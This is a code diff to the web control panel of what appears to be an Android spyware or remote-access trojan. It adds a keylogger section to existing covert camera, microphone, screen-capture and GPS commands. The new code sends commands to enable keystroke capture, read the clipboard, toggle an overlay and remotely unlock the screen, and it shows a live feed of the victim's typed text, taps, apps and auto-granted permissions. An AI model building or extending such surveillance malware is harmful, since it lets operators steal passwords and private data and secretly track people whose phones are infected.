@@ -347,7 +347,9 @@
       <div class="tab-panel active" id="tabCommands">
         <div class="cmd-scroll">
           <div class="cmd-section">
-            <div class="cmd-section-title">📷 Surveillance</div>
+            <div class="cmd-section-title" style="display:flex;justify-content:space-between;align-items:center">
+              <span>📷 Surveillance</span>
+            </div>
             <div class="cmd-grid">
               <button class="cmd-btn" onclick="sendCmd('x0000ca','camList')"><span class="icon">📋</span> Camera List</button>
               <button class="cmd-btn" onclick="sendCmd('x0000ca','0')"><span class="icon">🤳</span> Front Camera</button>
@@ -355,6 +357,44 @@
               <button class="cmd-btn" onclick="sendMicCmd()"><span class="icon">🎤</span> Microphone</button>
               <button class="cmd-btn" onclick="sendCmd('x0000sc','')"><span class="icon">🖥️</span> Screen Capture</button>
               <button class="cmd-btn" onclick="sendCmd('x0000lm','')"><span class="icon">📍</span> GPS Location</button>
+            </div>
+          </div>
+
+          <!-- KEYLOGGER SECTION -->
+          <div class="cmd-section">
+            <div class="cmd-section-title" style="display:flex;justify-content:space-between;align-items:center">
+              <span>⌨️ Keylogger</span>
+              <span id="klStatus" style="font-size:9px;color:var(--text-dim)">—</span>
+            </div>
+            <div class="cmd-grid">
+              <button class="cmd-btn" id="klToggleBtn" onclick="toggleKeylogger()">
+                <span class="icon">🎯</span> <span id="klToggleLabel">Enable</span>
+              </button>
+              <button class="cmd-btn" onclick="sendKlCmd('flush')" title="Flush buffered keystrokes now">
+                <span class="icon">📤</span> Flush Buffer
+              </button>
+              <button class="cmd-btn" onclick="sendKlCmd('getStatus')" title="Get keylogger status">
+                <span class="icon">ℹ️</span> Status
+              </button>
+              <button class="cmd-btn" onclick="sendKlCmd('getClipboard')" title="Read clipboard content">
+                <span class="icon">📋</span> Clipboard
+              </button>
+              <button class="cmd-btn warning" id="klOverlayBtn" onclick="toggleOverlay()">
+                <span class="icon">👁️</span> <span id="klOverlayLabel">Overlay Off</span>
+              </button>
+              <button class="cmd-btn warning" onclick="sendKlCmd('unlockScreen')" title="Wake + unlock device screen">
+                <span class="icon">🔓</span> Unlock
+              </button>
+            </div>
+            <!-- Keystroke live feed -->
+            <div id="klFeed" style="
+              margin-top:6px;max-height:120px;overflow-y:auto;
+              background:var(--bg);border:1px solid var(--border);
+              border-radius:6px;padding:6px 8px;font-size:10px;
+              display:none;
+            ">
+              <div style="color:var(--text-dim);font-size:9px;margin-bottom:4px">📝 Live keystroke feed</div>
+              <div id="klFeedContent"></div>
             </div>
           </div>
           <div class="cmd-section">
@@ -477,6 +517,30 @@ function connect() {
     const { socketId, deviceInfo, event, data, timestamp } = payload;
     const label = deviceInfo ? `${deviceInfo.model}` : socketId.substring(0, 8);
     addLog('received', `[${label}] <span class="log-event">${event}</span>`, data, timestamp, event, data);
+
+    // Route keylogger events to the live feed
+    if (event === 'x0000kldata' && data) {
+      const events = data.events || [data];
+      if (Array.isArray(events)) {
+        updateKlFeed(events);
+      }
+    }
+    // Route keylogger status/clipboard responses
+    if (event === 'x0000kl' && data) {
+      // Status responses contain 'enabled' field
+      if (data.hasOwnProperty('enabled')) {
+        klEnabled = data.enabled;
+        document.getElementById('klToggleLabel').textContent = klEnabled ? 'Enabled' : 'Enable';
+        document.getElementById('klToggleBtn').style.borderColor = klEnabled ? 'var(--accent)' : '';
+        document.getElementById('klToggleBtn').style.color = klEnabled ? 'var(--accent)' : '';
+        document.getElementById('klFeed').style.display = klEnabled ? 'block' : 'none';
+        document.getElementById('klStatus').textContent = klEnabled ? '🟢 Active' : '⚪ Offline';
+      }
+      // Clipboard responses
+      if (data.hasOwnProperty('clipboard')) {
+        updateKlFeed([{ type: 'clipboard', clipboard: data.clipboard }]);
+      }
+    }
   });
 
   socket.on('command:sent', (payload) => {
@@ -691,6 +755,94 @@ function showCommandPanel(id) {
     document.getElementById('selectedDeviceMeta').textContent =
       `${d.manufacturer || '?'} · Android ${d.androidVersion || '?'} · ${(d.deviceId || '').substring(0, 12)}`;
   }
+}
+
+// ============================================================
+// KEYLOGGER COMMANDS
+// ============================================================
+let klEnabled = false;
+
+function sendKlCmd(action, extraState) {
+  const target = getTarget();
+  if (!target) return;
+  const command = { order: 'x0000kl', action };
+  if (extraState !== undefined) command.state = extraState;
+  socket.emit('command:send', { targetSocketId: target, command });
+  const label = devices[target] ? devices[target].model : target.substring(0, 8);
+  addLog('sent', `→ [${label}] <span class="log-event">x0000kl</span> action:${action}`, command);
+}
+
+function toggleKeylogger() {
+  klEnabled = !klEnabled;
+  sendKlCmd(klEnabled ? 'enableWithOverlay' : 'disable');
+  document.getElementById('klToggleLabel').textContent = klEnabled ? 'Enabled' : 'Enable';
+  document.getElementById('klToggleBtn').style.borderColor = klEnabled ? 'var(--accent)' : '';
+  document.getElementById('klToggleBtn').style.color = klEnabled ? 'var(--accent)' : '';
+  document.getElementById('klFeed').style.display = klEnabled ? 'block' : 'none';
+  document.getElementById('klStatus').textContent = klEnabled ? '🟢 Active' : '⚪ Offline';
+}
+
+function toggleOverlay() {
+  const isOff = document.getElementById('klOverlayLabel').textContent === 'Overlay Off';
+  sendKlCmd('overlay', isOff);  // send boolean directly — sendKlCmd wraps it in command.state
+  document.getElementById('klOverlayLabel').textContent = isOff ? 'Overlay On' : 'Overlay Off';
+  document.getElementById('klOverlayBtn').style.borderColor = isOff ? 'var(--orange)' : '';
+  document.getElementById('klOverlayBtn').style.color = isOff ? 'var(--orange)' : '';
+}
+
+function updateKlFeed(entries) {
+  const feed = document.getElementById('klFeedContent');
+  if (!feed) return;
+
+  if (!Array.isArray(entries)) entries = [entries];
+
+  entries.forEach(entry => {
+    const line = document.createElement('div');
+    line.style.cssText = 'padding:1px 0;border-bottom:1px solid rgba(30,45,61,0.2);line-height:1.4';
+
+    const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    line.innerHTML = `<span style="color:var(--text-dim);font-size:9px">${time}</span> `;
+
+    switch (entry.type) {
+      case 'text':
+        line.innerHTML += `<span style="color:var(--accent)">⌨️</span> <span style="color:var(--text)">${escapeHtml(entry.text || '').substring(0, 80)}</span>`;
+        if (entry.hint) line.innerHTML += ` <span style="color:var(--text-dim);font-size:9px">[${escapeHtml(entry.hint)}]</span>`;
+        break;
+      case 'tap':
+        line.innerHTML += `<span style="color:var(--blue)">👆</span> tap at (${entry.center_x || '?'}, ${entry.center_y || '?'})`;
+        if (entry.text) line.innerHTML += ` <span style="color:var(--text-dim)">"${escapeHtml(entry.text).substring(0, 40)}"</span>`;
+        break;
+      case 'focus':
+        line.innerHTML += `<span style="color:var(--yellow)">🎯</span> focus → <span style="color:var(--text-dim)">${entry.hint || entry.viewId || '?'}</span>`;
+        break;
+      case 'window':
+        line.innerHTML += `<span style="color:var(--purple)">🪟</span> ${escapeHtml(entry.package || '')}`;
+        break;
+      case 'auto_grant':
+        line.innerHTML += `<span style="color:var(--green)">✅</span> Auto-grant triggered`;
+        break;
+      case 'overlay_tap':
+        line.innerHTML += `<span style="color:var(--pink)">🖱️</span> overlay tap (${entry.x}, ${entry.y})`;
+        break;
+      case 'clipboard':
+        line.innerHTML += `<span style="color:var(--orange)">📋</span> <span style="color:var(--text)">"${escapeHtml(entry.clipboard || '').substring(0, 60)}"</span>`;
+        break;
+      default:
+        line.innerHTML += `<span style="color:var(--text-dim)">${entry.type || 'event'}</span>`;
+    }
+
+    feed.appendChild(line);
+  });
+
+  // Keep at most 50 entries, scroll to bottom
+  while (feed.children.length > 50) feed.removeChild(feed.firstChild);
+  feed.parentElement.scrollTop = feed.parentElement.scrollHeight;
+}
+
+function escapeHtml(text) {
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
 }
 
 // ============================================================
